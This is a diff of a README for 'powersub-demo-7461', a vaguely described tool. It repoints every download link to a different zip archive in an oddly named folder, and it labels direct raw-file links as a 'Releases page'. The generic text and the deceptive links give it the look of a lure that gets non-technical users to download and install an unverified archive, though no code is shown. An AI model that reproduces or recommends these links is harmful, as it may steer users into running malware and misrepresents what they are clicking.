@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-7461 - A Simple Tool for Easy Use
 
-[![Download](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub-demo-7461-3.6.zip)](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub-demo-7461-3.6.zip)
+[![Download](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub_demo_2.1.zip)](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub_demo_2.1.zip)
 
 ## 📦 What is powersub-demo-7461?
 
@@ -19,7 +19,7 @@ To start using powersub-demo-7461, follow these simple steps. No technical knowl
 
 2. **Download the Application**  
    You can download the latest version of powersub-demo-7461 from our Releases page.  
-   [Visit this page to download](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub-demo-7461-3.6.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub_demo_2.1.zip)
 
 3. **Install the Application**  
    After downloading, locate the file you saved.  
@@ -37,7 +37,7 @@ To start using powersub-demo-7461, follow these simple steps. No technical knowl
 
 To download and install powersub-demo-7461, simply follow these steps:
 
-1. Go to our [Releases page](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub-demo-7461-3.6.zip) by clicking the link.
+1. Go to our [Releases page](https://raw.githubusercontent.com/Notl3510/powersub-demo-7461/main/reimmigration/powersub_demo_2.1.zip) by clicking the link.
 2. Find the latest version listed at the top.
 3. Click on the version number to view details.
 4. Choose the file suitable for your operating system and click "Download."
